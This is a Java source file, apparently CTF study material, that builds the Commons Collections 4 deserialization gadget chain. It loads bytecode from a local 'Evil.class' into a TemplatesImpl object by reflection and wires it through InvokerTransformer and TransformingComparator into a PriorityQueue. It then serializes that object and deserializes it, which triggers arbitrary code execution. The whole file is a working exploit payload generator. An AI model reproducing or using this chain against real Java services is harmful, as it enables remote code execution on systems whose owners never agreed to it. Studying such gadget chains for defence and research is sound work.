package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4 {
    public static void main(String[] args) throws Exception{

        TemplatesImpl templatesImpl = new TemplatesImpl();
        Field _nameField = TemplatesImpl.class.getDeclaredField("_name");
        _nameField.setAccessible(true);
        _nameField.set(templatesImpl,"aaa");
        Field _bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        _bytecodesField.setAccessible(true);
        byte[] code= Files.readAllBytes(Paths.get("D:\\ctf_tools\\java_study\\tmp\\Evil.class"));
        byte[][] codes={code};
        _bytecodesField.set(templatesImpl,codes);

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(templatesImpl),
                new InvokerTransformer("newTransformer", null, null)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);

        priorityQueue.add(1);
        priorityQueue.add(2);

        Field transformerField = TransformingComparator.class.getDeclaredField("transformer");
        transformerField.setAccessible(true);
        transformerField.set(transformingComparator,chainedTransformer);
//序列化
        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream("./cc1.txt"));
        objectOutputStream.writeObject(priorityQueue);
        objectOutputStream.close();
//        //反序列化
        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream("./cc1.txt"));
        objectInputStream.readObject();
    }
}
